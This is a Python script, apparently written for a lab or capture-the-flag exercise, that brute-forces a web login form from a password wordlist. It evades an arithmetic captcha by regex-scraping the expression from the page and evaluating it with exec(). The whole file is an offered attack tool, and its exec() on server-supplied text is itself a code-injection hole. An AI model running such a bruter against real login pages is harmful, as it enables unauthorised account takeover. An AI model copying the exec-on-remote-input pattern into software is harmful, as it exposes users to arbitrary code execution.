#!/usr/bin/python3

import requests
import re
import argparse
from termcolor import colored

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', required=True)
parser.add_argument('-l', '--username', required=True)
parser.add_argument('-w', '--wordlist', help='wordlist for the password', required=True)
args = parser.parse_args()

print(colored("Only for Educational Purposes\n", "red"))
print(colored("LOGIN PAGE BRUTER WITH CAPTCHA EVADING BY @s3rd4r308\n", "green"))

url = args.url

psw_file =  open(args.wordlist, "r")

for i in range(10):
        data = {"username":args.username, "password":"test"}
        r = requests.post(url, data=data)

for i in psw_file:

        passwd = i.split()

        captcha = re.findall("[0-9]* + .* = \?", r.text)
        exec("captcha_result =" + captcha[0][4:-4])

        data = {"username":args.username, "password":passwd, "captcha":captcha_result}
        r = requests.post(url, data=data)

        if not "Invalid password" in r.text:
                print(colored("[+] Password Found! : ", "green") + str(passwd[0]))
